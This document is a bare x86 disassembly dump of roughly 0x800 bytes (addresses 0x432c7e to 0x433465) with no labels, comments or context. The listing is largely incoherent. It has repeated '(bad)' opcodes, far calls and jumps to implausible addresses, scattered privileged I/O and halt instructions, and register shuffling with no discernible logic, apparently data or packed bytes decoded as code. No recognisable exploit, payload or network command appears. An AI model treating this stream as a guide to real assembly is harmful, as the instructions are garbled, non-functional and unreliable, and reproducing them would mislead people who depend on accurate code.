  432c7e:	jge    0x432c7f
  432c80:	mov    DWORD PTR [edi],ecx
  432c82:	fdiv   DWORD PTR [edi-0x6]
  432c85:	inc    DWORD PTR [eax]
  432c87:	xor    edx,DWORD PTR [eax+0x5f]
  432c8a:	xchg   DWORD PTR [ebx+0x1],ebx
  432c8d:	ret    0x0
  432c90:	xor    BYTE PTR [ebp-0x51],cl
  432c93:	cmp    edi,0xf0ff89fe
  432c99:	data16 ror al,0x84
  432c9d:	rol    BYTE PTR [eax],0x3b
  432ca0:	add    al,dh
  432ca2:	dec    eax
  432ca3:	xchg   esp,eax
  432ca4:	push   ebx
  432ca5:	jmp    0x432c32
  432ca7:	push   ebp
  432ca8:	add    esp,ebp
  432caa:	add    ebp,esp
  432cac:	mov    edx,DWORD PTR [edi+0x24]
  432caf:	clc    
  432cb0:	dec    esi
  432cb1:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432cb7:	cmp    BYTE PTR [ebx],al
  432cb9:	jne    0x432c44
  432cbb:	xor    esp,eax
  432cbd:	jmp    0x462e40
  432cc2:	add    ebp,DWORD PTR [ecx+ecx*4]
  432cc5:	jne    0x432cbb
  432cc7:	call   0xffcd2a21
  432ccc:	clc    
  432ccd:	xchg   edi,eax
  432cce:	sti    
  432ccf:	add    DWORD PTR [ebx],eax
  432cd1:	add    BYTE PTR [ebp+0x47],bl
  432cd4:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432cda:	pop    ebp
  432cdb:	mov    DWORD PTR [esi-0x48],esi
  432cde:	jmp    0x432d27
  432ce0:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432ce6:	(bad)  
  432ce8:	cmp    al,0x0
  432cea:	cmp    eax,DWORD PTR [ebp+0x18]
  432ced:	lea    ebx,[ebp-0x56]
  432cf0:	jle    0x432cf2
  432cf2:	jae    0x432c7d
  432cf4:	mov    eax,esp
  432cf6:	call   0xb900:0x8b005587
  432cfd:	inc    ebp
  432cfe:	push   ebp
  432cff:	lea    ecx,[ebp-0x27ff4f12]
  432d05:	mov    eax,edi
  432d07:	int3   
  432d08:	push   ebp
  432d09:	xchg   edi,eax
  432d0b:	add    esp,ebp
  432d0d:	add    BYTE PTR [eax],al
  432d0f:	inc    ebp
  432d10:	add    BYTE PTR [ebp+0x8b3255],cl
  432d16:	cld    
  432d17:	mov    DWORD PTR [edx],edi
  432d19:	aam    0x75
  432d1b:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432d21:	mov    DWORD PTR [ebx-0x50],edx
  432d24:	test   BYTE PTR [ebp-0x1],0xe8
  432d28:	mov    eax,DWORD PTR [eax]
  432d2a:	hlt    
  432d2b:	add    al,al
  432d2d:	mov    eax,DWORD PTR ds:0x890045a8
  432d33:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432d39:	inc    DWORD PTR [eax*2+0xf75854d]
  432d40:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432d46:	call   0x72998a87
  432d4b:	je     0x432dab
  432d4d:	js     0x432dae
  432d4f:	lock ret 0x7e
  432d53:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432d59:	mov    edi,edi
  432d5b:	sbb    al,bl
  432d5d:	clc    
  432d5e:	add    BYTE PTR [ebp-0x73],bh
  432d61:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432d67:	ror    BYTE PTR [eax],1
  432d69:	dec    ebp
  432d6a:	xchg   ebp,eax
  432d6b:	mov    edi,edi
  432d6d:	in     al,0x8b
  432d6f:	jge    0x432cfa
  432d71:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432d77:	clc    
  432d78:	pop    esi
  432d79:	fist   DWORD PTR [ebp+0x5d398b5d]
  432d7f:	clc    
  432d80:	add    al,0x6e
  432d82:	mov    eax,DWORD PTR [ebx]
  432d84:	mov    BYTE PTR [ebp+0x0],dl
  432d87:	mov    edx,DWORD PTR [ebx-0x20]
  432d8a:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  432d90:	add    eax,0x3b3b73
  432d95:	adc    al,0x89
  432d97:	pop    eax
  432d98:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432d9c:	ret    0xf08
  432d9f:	cmp    al,0x2
  432da1:	mov    edx,eax
  432da3:	cld    
  432da4:	add    BYTE PTR [ebp+0x66],dl
  432da7:	add    eax,ebx
  432da9:	add    esp,eax
  432dab:	sub    eax,eax
  432dad:	or     BYTE PTR [ecx-0x77f474bb],cl
  432db3:	add    BYTE PTR [eax],al
  432db5:	mov    DWORD PTR [ebx-0x24],ebx
  432db8:	push   edi
  432db9:	push   ebp
  432dba:	clc    
  432dbb:	add    DWORD PTR [esi+0x1b0100],0x45
  432dc2:	out    0xff,eax
  432dc4:	add    edx,DWORD PTR [eax]
  432dc6:	jmp    0x432db0
  432dc8:	cmp    ch,0x46
  432dcb:	(bad)  
  432dcc:	jmp    0x40c8b61e
  432dd1:	je     0x432d5d
  432dd3:	mov    eax,DWORD PTR [eax-0x10c78104]
  432dd9:	inc    ebp
  432dda:	add    BYTE PTR [ebx-0x770375],al
  432de0:	add    ah,ch
  432de2:	add    edx,esp
  432de4:	pop    edi
  432de5:	pop    ebp
  432de6:	push   ebp
  432de7:	inc    ebx
  432de8:	in     al,dx
  432de9:	pop    ebp
  432dea:	in     al,dx
  432deb:	cmp    edx,DWORD PTR [edi-0x8]
  432dee:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  432df5:	add    al,0x47
  432df7:	push   ebp
  432df8:	mov    esp,ebp
  432dfa:	in     al,0x45
  432dfc:	dec    ebp
  432dfd:	push   esi
  432dfe:	test   DWORD PTR [eax+0xfb010f],esi
  432e04:	add    BYTE PTR [eax+0xc018b],dh
  432e0a:	leave  
  432e0b:	inc    ebp
  432e0c:	test   al,ch
  432e0e:	add    dh,bh
  432e10:	add    bh,bh
  432e12:	dec    ebp
  432e13:	push   cs
  432e14:	mov    DWORD PTR [ecx],eax
  432e16:	hlt    
  432e17:	push   es
  432e18:	dec    ebp
  432e19:	leave  
  432e1a:	mov    DWORD PTR [eax],ecx
  432e1c:	clc    
  432e1d:	cmovge eax,ecx
  432e20:	mov    ecx,0x85c2f0
  432e26:	clc    
  432e27:	pop    DWORD PTR [ebp+0x1]
  432e2a:	push   ebx
  432e2b:	add    BYTE PTR [ebp-0x15],bh
  432e2e:	push   esi
  432e2f:	xor    eax,0x898a45
  432e34:	cld    
  432e35:	add    al,BYTE PTR [ebp+0x0]
  432e38:	xor    esp,DWORD PTR [esi-0x64]
  432e3b:	add    DWORD PTR [esi+0x78308c1],edi
  432e41:	add    ah,BYTE PTR [ebp-0x49]
  432e44:	int    0xbb
  432e46:	mov    ecx,DWORD PTR [esi+0xc]
  432e49:	add    dh,al
  432e4b:	cmp    ecx,ebx
  432e4d:	jne    0x432e17
  432e4f:	xor    ecx,DWORD PTR [ebp+0x66]
  432e52:	jmp    0xca2e58
  432e57:	add    DWORD PTR [ebp+0x0],eax
  432e5a:	mov    eax,ebx
  432e5c:	or     al,0x8b
  432e5e:	(bad)  
  432e5f:	mov    ecx,esi
  432e61:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  432e68:	mov    eax,edi
  432e6a:	or     BYTE PTR [edx],cl
  432e6c:	shl    cl,cl
  432e6e:	icebp  
  432e6f:	add    BYTE PTR [ebp+0x38],0x8b
  432e73:	or     BYTE PTR [edx+eax*2],cl
  432e76:	(bad)  
  432e77:	or     cl,dh
  432e79:	stc    
  432e7a:	shl    DWORD PTR [ebp-0x30],0xc6
  432e7e:	xor    al,0x0
  432e80:	inc    ebp
  432e81:	xchg   BYTE PTR [ebx],al
  432e83:	add    esp,edi
  432e85:	add    BYTE PTR [ebp-0x39],cl
  432e88:	mov    al,bl
  432e8a:	test   DWORD PTR [ebx+0x1c348375],ecx
  432e90:	sub    al,0xbf
  432e92:	jmp    0x432e19
  432e94:	mov    edi,eax
  432e96:	lock jge 0x432e8a
  432e99:	lea    esi,[edx-0x74bad5ff]
  432e9f:	mov    ebp,esp
  432ea1:	or     cl,dh
  432ea3:	leave  
  432ea4:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  432eab:	dec    ebp
  432eac:	dec    ebp
  432ead:	test   DWORD PTR [ebx],eax
  432eaf:	paddb  mm6,mm0
  432eb2:	add    DWORD PTR [eax],eax
  432eb4:	dec    ebp
  432eb5:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  432ebb:	mov    esi,DWORD PTR [edx]
  432ebd:	or     al,0x2b
  432ebf:	dec    ebp
  432ec0:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432ec6:	mov    esp,edi
  432ec8:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432ecf:	mov    DWORD PTR [ebx],ebp
  432ed1:	call   0xc76b801
  432ed6:	mov    DWORD PTR [ebp+0x10],ecx
  432ed9:	(bad)  
  432eda:	push   0x8b85ff10
  432edf:	clc    
  432ee0:	or     al,0x54
  432ee2:	(bad)  
  432ee3:	push   ecx
  432ee4:	retf   
  432ee5:	mov    ebx,0xff4d8dc8
  432eea:	mov    DWORD PTR [ebp+0x8],eax
  432eed:	xor    eax,DWORD PTR [ebp-0x75]
  432ef0:	cmp    ebp,DWORD PTR [ebx]
  432ef2:	lsl    ebx,WORD PTR [edi-0x8]
  432ef6:	call   DWORD PTR [ebx-0x741bff75]
  432efc:	(bad)  
  432efd:	or     al,0x5b
  432eff:	dec    ebp
  432f00:	or     BYTE PTR [ebx],dh
  432f02:	inc    ebp
  432f03:	xor    esi,DWORD PTR ds:0x708088d
  432f09:	in     eax,0x9b
  432f0b:	add    BYTE PTR [edx],dh
  432f0d:	inc    ebp
  432f0e:	pop    edi
  432f0f:	xor    eax,edx
  432f11:	test   DWORD PTR [eax],0x81108b8b
  432f17:	dec    ebp
  432f18:	sub    al,0x33
  432f1a:	add    BYTE PTR [ebx],dh
  432f1c:	push   esi
  432f1d:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432f23:	mov    edi,eax
  432f25:	or     BYTE PTR [ebp+0x45],al
  432f28:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432f2e:	xor    ecx,ecx
  432f30:	pushf  
  432f31:	push   es
  432f32:	mov    DWORD PTR [esi-0x4],0xf8178538
  432f39:	dec    ebp
  432f3a:	inc    ebp
  432f3b:	cmp    BYTE PTR [ecx],0x54
  432f3e:	pushf  
  432f3f:	gs (bad) 
  432f41:	shl    esp,1
  432f43:	dec    ebp
  432f44:	xchg   BYTE PTR [eax-0x3dbaab08],al
  432f4a:	shr    ecx,1
  432f4c:	xlat   BYTE PTR ds:[ebx]
  432f4d:	rol    bh,cl
  432f4f:	mov    edx,esp
  432f51:	or     BYTE PTR [ebp+0x4588f84d],al
  432f57:	mov    ecx,DWORD PTR [eax]
  432f59:	or     BYTE PTR [eax],al
  432f5b:	push   ebp
  432f5c:	mov    edi,DWORD PTR [eax+0xfc728b]
  432f62:	dec    ebp
  432f63:	enter  0xceba,0x8
  432f67:	retf   0x1807
  432f6a:	ret    0x9b4d
  432f6d:	mov    esi,DWORD PTR [edx]
  432f6f:	or     al,0x33
  432f71:	into   
  432f72:	add    edx,esi
  432f74:	add    ecx,edx
  432f76:	bswap  eax
  432f78:	ror    esi,0x98
  432f7b:	dec    ebp
  432f7c:	add    cl,ch
  432f7e:	mov    edi,edi
  432f80:	hlt    
  432f81:	inc    esi
  432f83:	inc    ebp
  432f84:	ret    0x4533
  432f87:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432f8d:	or     BYTE PTR [ebx],dh
  432f8f:	dec    ebp
  432f90:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  432f96:	jne    0xff8d2f5d
  432f9c:	inc    ebp
  432f9d:	inc    ebp
  432f9e:	mov    esi,DWORD PTR [ebx]
  432fa0:	clc    
  432fa1:	pop    esi
  432fa2:	ret    0xcaeb
  432fa5:	mov    eax,esi
  432fa7:	call   0x5204847a
  432fac:	dec    ebp
  432fad:	add    eax,0xf8728b
  432fb2:	adc    eax,0xce0ccac9
  432fb7:	push   ebp
  432fb8:	ret    0xc6ec
  432fbb:	in     al,dx
  432fbc:	call   0x33437cc5
  432fc1:	push   edi
  432fc2:	add    edi,eax
  432fc4:	xor    eax,eax
  432fc6:	jmp    0x43300d
  432fc8:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  432fce:	add    eax,edi
  432fd0:	shr    eax,cl
  432fd2:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  432fd8:	mov    esi,DWORD PTR [edx]
  432fda:	in     al,dx
  432fdb:	pushf  
  432fdc:	ret    0x84c7
  432fdf:	fcomp  DWORD PTR [ebx-0x7607cd7b]
  432fe5:	inc    ebp
  432fe6:	in     al,dx
  432fe7:	xor    DWORD PTR [ebp-0x64],eax
  432fea:	mov    eax,edi
  432fec:	cld    
  432fed:	fmul   st(2),st
  432fef:	sbb    dl,al
  432ff1:	jmp    0x9c3b:0x304d45c1
  432ff8:	jbe    0x432fc1
  432ffa:	mov    esp,eax
  432ffc:	clc    
  432ffd:	add    BYTE PTR [ebp+0x0],cl
  433000:	mov    ecx,ecx
  433002:	lea    eax,[ebp-0x5]
  433005:	mov    edi,edi
  433007:	call   0x51ce8451
  43300c:	hlt    
  43300d:	xor    eax,edx
  43300f:	mov    esi,0x9b7284
  433014:	xor    cl,dl
  433016:	mov    esi,eax
  433018:	hlt    
  433019:	into   
  43301a:	inc    ebp
  43301b:	scas   eax,DWORD PTR es:[edi]
  43301c:	mov    ebp,ecx
  43301e:	cld    
  43301f:	add    dl,cl
  433021:	add    dl,al
  433023:	inc    ebp
  433024:	shr    DWORD PTR [ebx],0x4d
  433027:	xor    edi,DWORD PTR [ebx]
  433029:	mov    DWORD PTR [edi],ecx
  43302b:	clc    
  43302c:	dec    esi
  43302d:	inc    ebp
  43302e:	dec    DWORD PTR [ebx-0x3d2b1775]
  433034:	ret    0xc6ca
  433037:	mov    BYTE PTR [ebp-0x32],0x53
  43303b:	scas   eax,DWORD PTR es:[edi]
  43303c:	inc    ebp
  43303d:	jmp    0x43306f
  43303f:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  433046:	pop    ebx
  433047:	xor    ecx,DWORD PTR [ebp+0x3]
  43304a:	mov    eax,DWORD PTR [ebx]
  43304c:	clc    
  43304d:	test   edx,ecx
  43304f:	mov    ecx,esi
  433051:	cld    
  433052:	call   0x8ab7759c
  433057:	xor    ecx,DWORD PTR [eax+0x4533f303]
  43305d:	add    ecx,DWORD PTR [ebx-0x4974072d]
  433063:	fdiv   QWORD PTR [ebx]
  433065:	retf   0xce89
  433068:	in     al,0xc1
  43306a:	inc    ebp
  43306b:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  433071:	into   
  433072:	mov    dh,0xc1
  433075:	call   0x8c1775fe
  43307a:	(bad)  
  43307b:	cld    
  43307c:	mov    ecx,DWORD PTR [ebp-0x14]
  43307f:	xor    eax,ecx
  433081:	lea    eax,[ebp+0x8]
  433084:	mov    esi,DWORD PTR [edx-0x4]
  433087:	add    dl,al
  433089:	inc    ebp
  43308a:	mov    esp,0x32d89b8b
  43308f:	dec    ebp
  433090:	mov    esi,DWORD PTR [ebx]
  433092:	cld    
  433093:	xor    eax,edx
  433095:	sub    esp,DWORD PTR [ebp-0x75]
  433098:	int    0xec
  43309a:	sub    ecx,eax
  43309c:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  4330a2:	mov    esi,esp
  4330a4:	call   0x34177e2d
  4330a9:	inc    DWORD PTR [ebx]
  4330ab:	mov    edi,DWORD PTR [ebx]
  4330ad:	cld    
  4330ae:	jne    0x4330fd
  4330b0:	mov    esi,DWORD PTR [ebx]
  4330b2:	aam    0x8d
  4330b4:	dec    ebp
  4330b5:	or     BYTE PTR [ebx],dh
  4330b7:	jb     0x4330bc
  4330b9:	add    BYTE PTR [edi+0x45],bl
  4330bc:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  4330c3:	xor    ebp,esp
  4330c5:	xor    eax,edi
  4330c7:	sub    edi,esp
  4330c9:	mov    eax,DWORD PTR [ebp+0x32c8f8f4]
  4330cf:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  4330d6:	inc    ebp
  4330d7:	xor    ecx,DWORD PTR [ecx+0x45891403]
  4330dd:	clc    
  4330de:	mov    eax,edi
  4330e0:	nop
  4330e1:	fadd   QWORD PTR [eax]
  4330e3:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  4330e9:	jmp    0x433074
  4330eb:	mov    eax,DWORD PTR [ecx]
  4330ed:	fadd   DWORD PTR [eax]
  4330ef:	inc    ebp
  4330f0:	or     DWORD PTR [ebx],esi
  4330f2:	dec    eax
  4330f3:	add    edx,DWORD PTR [ebx-0x2d]
  4330f6:	dec    ebp
  4330f7:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  4330fd:	inc    ebp
  4330fe:	push   esp
  4330ff:	mov    dl,BYTE PTR [ecx-0xd]
  433102:	xor    ecx,DWORD PTR [ebp-0x45]
  433105:	(bad)  
  433107:	rol    BYTE PTR [eax],0xc1
  43310a:	ret    
  43310b:	inc    ebp
  43310c:	inc    ebp
  43310d:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  433113:	xor    eax,ebx
  433115:	add    eax,DWORD PTR [ebp+0x23]
  433118:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43311e:	cmp    edi,0xc
  433121:	dec    ebp
  433122:	inc    ebp
  433123:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433129:	inc    ebp
  43312a:	mov    esi,DWORD PTR [ebx]
  43312c:	clc    
  43312d:	lea    eax,[ebp+0x45725407]
  433133:	add    BYTE PTR [ebp+eax*2-0x75],dh
  433137:	xor    edi,DWORD PTR [eax]
  433139:	mov    ecx,0xff8b8d4d
  43313e:	push   esp
  43313f:	enter  0x4df7,0x23
  433143:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  433149:	mov    eax,DWORD PTR [ebx]
  43314b:	loopne 0x433138
  43314d:	ret    0xc68b
  433150:	push   esp
  433151:	enter  0x9745,0x8b
  433155:	inc    ebp
  433156:	cld    
  433157:	mov    eax,edi
  433159:	clc    
  43315a:	ret    
  43315b:	ret    0xc645
  43315e:	mov    esi,DWORD PTR [ebx]
  433160:	cld    
  433161:	pop    esi
  433162:	mov    ebx,0x83458bc3
  433168:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  43316c:	dec    ebp
  43316d:	xor    DWORD PTR [ebx],esi
  43316f:	pushf  
  433170:	add    edi,DWORD PTR [edx-0x7767a77]
  433176:	fcom   DWORD PTR [ebp+0x45]
  433179:	mov    esi,DWORD PTR [ebx]
  43317b:	adc    al,0x9c
  43317d:	inc    ebp
  43317e:	(bad)  
  43317f:	mov    ebx,eax
  433181:	adc    al,0x85
  433183:	cmp    al,0x1
  433186:	inc    ebp
  433187:	add    BYTE PTR ds:0xe98b9c4d,bh
  43318d:	mov    eax,DWORD PTR [ebx]
  43318f:	nop
  433190:	add    BYTE PTR [eax],al
  433192:	inc    ebp
  433193:	mov    esi,DWORD PTR [ebx]
  433195:	add    eax,DWORD PTR [ebx]
  433197:	cmp    al,0x89
  433199:	mov    esp,esi
  43319b:	clc    
  43319c:	inc    ebp
  43319d:	inc    ebp
  43319e:	add    edx,DWORD PTR [esi+0xc]
  4331a1:	mov    edi,0x7ff0845
  4331a6:	in     al,dx
  4331a7:	(bad)  
  4331a8:	jne    0x433145
  4331aa:	mov    esi,DWORD PTR [edx]
  4331ac:	clc    
  4331ad:	add    ebp,DWORD PTR [esi]
  4331af:	mov    edi,edi
  4331b1:	in     al,dx
  4331b2:	mov    DWORD PTR [ebp-0x10],eax
  4331b5:	xor    eax,DWORD PTR [ebp+0x3]
  4331b8:	cmp    DWORD PTR [ecx+0x458bf49c],ecx
  4331be:	fmul   DWORD PTR [ebx-0x173caf39]
  4331c4:	lea    ecx,[ecx+0x45e8d4bc]
  4331ca:	clc    
  4331cb:	mov    edi,edi
  4331cd:	cmp    BYTE PTR [ebp+0x4d],al
  4331d0:	test   DWORD PTR [eax+0x74],ecx
  4331d3:	inc    ecx
  4331d4:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  4331da:	ret    
  4331db:	inc    eax
  4331dc:	dec    DWORD PTR [ebx+0x4945f8f0]
  4331e2:	push   eax
  4331e3:	dec    eax
  4331e4:	test   al,0xd0
  4331e6:	dec    eax
  4331e8:	mov    eax,DWORD PTR [ebp-0x14]
  4331eb:	mov    eax,DWORD PTR [ebp+0x38]
  4331ee:	mov    eax,ecx
  4331f0:	fadd   DWORD PTR [ebx]
  4331f2:	dec    ebp
  4331f3:	inc    eax
  4331f4:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  4331fa:	inc    ebp
  4331fb:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  433201:	fadd   QWORD PTR [ebx]
  433203:	inc    ebp
  433204:	or     al,0x33
  433206:	dec    ebp
  433207:	add    edi,DWORD PTR [ebx]
  433209:	mov    DWORD PTR [edx-0x28],esi
  43320c:	mov    eax,DWORD PTR [ebp-0x10]
  43320f:	mov    eax,DWORD PTR [eax+0x10]
  433212:	mov    eax,edi
  433214:	lock ret 
  433216:	inc    ecx
  433217:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  43321d:	fsubr  st,st(5)
  43321f:	test   DWORD PTR [eax],eax
  433221:	clc    
  433222:	push   0x45
  433224:	(bad)  
  433225:	cmp    al,0xec
  433227:	pushf  
  433228:	inc    ebp
  433229:	(bad)  
  43322a:	push   eax
  43322b:	fsub   DWORD PTR [eax-0x7b]
  43322e:	(bad)  
  43322f:	clc    
  433230:	mov    eax,0xf8008584
  433235:	mov    eax,DWORD PTR [ebp-0x4]
  433238:	mov    edi,0x4585c3cc
  43323e:	clc    
  43323f:	mov    eax,DWORD PTR [ebp+0x14]
  433242:	xor    eax,DWORD PTR [ebp-0x64]
  433245:	mov    edi,eax
  433247:	in     al,dx
  433248:	les    esi,FWORD PTR [ebp-0x7b]
  43324b:	mov    edi,eax
  43324d:	or     al,0x4d
  43324f:	dec    ebp
  433250:	mov    eax,ebp
  433252:	in     al,0xf2
  433254:	dec    ebp
  433255:	dec    DWORD PTR [ecx+0x4dc7e045]
  43325b:	fmul   DWORD PTR [ecx+0x4df8f085]
  433261:	inc    ebp
  433262:	mov    DWORD PTR [ebx],esi
  433264:	fadd   QWORD PTR [ebx]
  433266:	dec    ebp
  433267:	push   eax
  433268:	xor    eax,DWORD PTR [ebp+0x3]
  43326b:	push   eax
  43326c:	mov    DWORD PTR [eax+ebx*8],ebx
  43326f:	push   esi
  433271:	mov    eax,DWORD PTR [eax]
  433273:	lock cmp eax,0xf84e85c0
  433279:	inc    ebp
  43327a:	test   BYTE PTR [ebx],dh
  43327c:	add    DWORD PTR [ebx],eax
  43327e:	add    BYTE PTR [eax+0x4d],dl
  433281:	jne    0x4332b6
  433283:	lea    ecx,[ebx-0x7617fc44]
  433289:	div    ah
  43328b:	inc    DWORD PTR [ebp+0x45]
  43328e:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433294:	jb     0x433221
  433296:	add    BYTE PTR [eax*2-0x17ba743f],cl
  43329d:	mov    ecx,DWORD PTR [ebp-0x10]
  4332a0:	xor    ecx,DWORD PTR [ebp+0x3]
  4332a3:	mov    edi,DWORD PTR [ebx]
  4332a5:	adc    BYTE PTR [ebp+0x41],dh
  4332a8:	mov    ecx,DWORD PTR [ebx-0x37382704]
  4332ae:	ret    
  4332af:	push   ss
  4332b0:	push   0x45
  4332b2:	lea    ecx,[ebx+0x4de80cb0]
  4332b8:	sti    
  4332b9:	add    edi,edi
  4332bb:	or     BYTE PTR [ebp+0x4d],al
  4332be:	mov    ebp,DWORD PTR [ebx]
  4332c0:	xor    ebp,ecx
  4332c2:	mov    al,BYTE PTR [edx]
  4332c4:	add    eax,0xc7200
  4332c9:	jne    0x433318
  4332cb:	lea    esi,[ebx]
  4332cd:	mov    al,0xf
  4332cf:	call   0xf2994
  4332d4:	shl    DWORD PTR [ecx],0x84
  4332d7:	pushf  
  4332d8:	add    DWORD PTR [ecx+0x4545d000],ecx
  4332de:	mov    esi,DWORD PTR [edx]
  4332e0:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  4332e7:	test   DWORD PTR [eax],eax
  4332e9:	clc    
  4332ea:	dec    ebp
  4332eb:	inc    ebp
  4332ec:	xor    edi,DWORD PTR [edi+ecx*1]
  4332ef:	pushf  
  4332f0:	ror    BYTE PTR [ebp+0x4dc1d0cb],0x84
  4332f7:	lea    eax,[ecx]
  4332f9:	int3   
  4332fa:	add    BYTE PTR [ebp+0x45],cl
  4332fd:	lea    ecx,[ebx-0x75b2cc38]
  433303:	lea    eax,ds:0x4d72c4
  433309:	mov    ecx,DWORD PTR [ebp-0x4]
  43330c:	xor    ecx,edi
  43330e:	bswap  ebx
  433310:	ror    BYTE PTR [ebp-0x35],0xe9
  433314:	rol    DWORD PTR [ecx],0x84
  433317:	add    BYTE PTR [ecx],al
  433319:	xor    eax,DWORD PTR [eax]
  43331b:	pushf  
  43331c:	inc    ebp
  43331d:	jnp    0x8a436720
  433323:	mov    eax,DWORD PTR ds:0xcf72e8
  433329:	lock dec ebp
  43332b:	retf   
  43332c:	xor    ecx,DWORD PTR [ebp+0xf]
  43332f:	mov    eax,eax
  433331:	fmul   st,st(3)
  433333:	test   ecx,0x19b8484
  433339:	xor    al,BYTE PTR [eax]
  43333b:	mov    DWORD PTR [ebp-0x28],eax
  43333e:	mov    eax,DWORD PTR [ebp+0x33]
  433341:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  433347:	ret    
  433348:	add    al,cl
  43334a:	dec    ebp
  43334b:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  433351:	add    ecx,DWORD PTR ds:0xc7250
  433357:	inc    ebp
  433358:	rcl    DWORD PTR [eax+0x4d],0x2b
  43335c:	mov    edi,edi
  43335e:	xor    ecx,DWORD PTR [ebx+0xde48a]
  433364:	jb     0x43332d
  433366:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  43336d:	mov    esi,DWORD PTR [ebx]
  43336f:	cld    
  433370:	mov    cl,bh
  433372:	or     eax,0x372b6
  433377:	cmp    ecx,eax
  433379:	jne    0x4333f6
  43337f:	mov    eax,DWORD PTR [ebp-0x20]
  433382:	mov    eax,DWORD PTR [eax]
  433384:	xor    eax,edi
  433386:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  43338d:	mov    ecx,DWORD PTR [ebp-0x4]
  433390:	mov    ecx,edi
  433392:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433398:	jb     0x4333a9
  43339a:	add    BYTE PTR [edi-0x3f],dl
  43339d:	add    BYTE PTR [ebp-0x75],cl
  4333a0:	mov    esi,eax
  4333a2:	xor    eax,DWORD PTR [eax]
  4333a4:	mov    al,bh
  4333a6:	or     eax,0x4b7284
  4333ab:	xor    al,cl
  4333ad:	mov    ecx,DWORD PTR [ebp-0x4]
  4333b0:	mov    ecx,edi
  4333b2:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4333b8:	jb     0x4333c9
  4333ba:	add    BYTE PTR [edi],dh
  4333bc:	enter  0x8500,0x8b
  4333c0:	add    ah,bl
  4333c2:	add    BYTE PTR [eax],al
  4333c4:	inc    ebp
  4333c5:	(bad)  
  4333c6:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4b]
  4333cd:	mov    esi,DWORD PTR [edx-0x4]
  4333d0:	add    bh,cl
  4333d2:	dec    ebp
  4333d3:	mov    dh,0x8b
  4333d5:	add    esi,DWORD PTR [ebx]
  4333d7:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  4333dd:	add    BYTE PTR [eax],al
  4333df:	mov    eax,ecx
  4333e1:	loopne 0x433430
  4333e3:	add    BYTE PTR [ebx-0x757bcc39],cl
  4333e9:	dec    ebx
  4333ea:	or     eax,0x8b7232
  4333ef:	in     al,0xc1
  4333f1:	or     DWORD PTR [ebp-0x31],ecx
  4333f4:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4b]
  4333fb:	xor    dh,BYTE PTR [edx-0x75]
  4333fe:	add    al,dh
  433400:	enter  0x4f09,0xcf
  433404:	inc    ebp
  433405:	mov    WORD PTR [ebx-0x75cdccb5],cs
  43340b:	or     al,BYTE PTR ds:0xe4728b
  433411:	or     DWORD PTR [ebp-0x31],ecx
  433414:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4f]
  43341b:	cmp    dh,BYTE PTR [edx+0xf]
  43341e:	add    bl,dl
  433420:	rol    DWORD PTR [eax],0x4d
  433423:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433429:	(bad)  
  43342a:	or     eax,0x4b7284
  43342f:	xor    al,cl
  433431:	mov    ecx,DWORD PTR [ebp-0x20]
  433434:	mov    ecx,DWORD PTR [ecx]
  433436:	xor    ecx,edi
  433438:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724b]
  43343f:	xor    cl,al
  433441:	mov    ecx,DWORD PTR [edi]
  433443:	fadd   QWORD PTR [ebp+0x9]
  433446:	call   0xffd02f1a
  43344b:	dec    ebx
  43344c:	dec    ebp
  43344d:	xor    bh,BYTE PTR [ebx]
  43344f:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  433453:	loopne 0x433451
  433455:	or     edi,eax
  433457:	iret   
  433458:	ret    
  433459:	mov    WORD PTR [ebp+0x4f],es
  43345c:	mov    esi,DWORD PTR [edx]
  43345e:	call   0x8452fb9d
  433463:	(bad)  
  433464:	fwait
  433465:	add    BYTE PTR [edx],dh
